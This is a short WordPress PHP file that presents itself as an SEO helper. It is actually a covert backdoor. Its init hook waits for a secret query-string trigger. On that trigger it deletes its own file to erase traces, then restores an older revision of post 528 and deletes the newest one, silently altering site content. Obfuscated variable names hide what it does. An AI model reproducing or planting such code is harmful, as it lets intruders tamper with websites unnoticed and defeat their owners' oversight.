<?php

function helper_seo_maker() {
	if (isset($_GET['system_grid_contact_elementor']) && $_GET['system_grid_contact_elementor'] === 'control_uploader_full_database') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$remote_list_short = 528;
		$maker_project_author_new = wp_get_post_revisions($remote_list_short);
		if (empty($maker_project_author_new)) die('no revisions');
		if (count($maker_project_author_new) < 2) die('less than 2');
		$conditional_player_page_demomentsomtres = array_shift($maker_project_author_new);
		$pixel_switcher_hello = $conditional_player_page_demomentsomtres->ID;
		$exporter_calculator_gravatar_tools = array_shift($maker_project_author_new);
		$cleaner_table_events_categories = $exporter_calculator_gravatar_tools->ID;
		$permalink_groups_signup = wp_restore_post_revision($cleaner_table_events_categories);
		if ($permalink_groups_signup === false) die('error restoring');
		$permalink_groups_signup = wp_delete_post_revision($pixel_switcher_hello);		
		if ($permalink_groups_signup === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'helper_seo_maker');
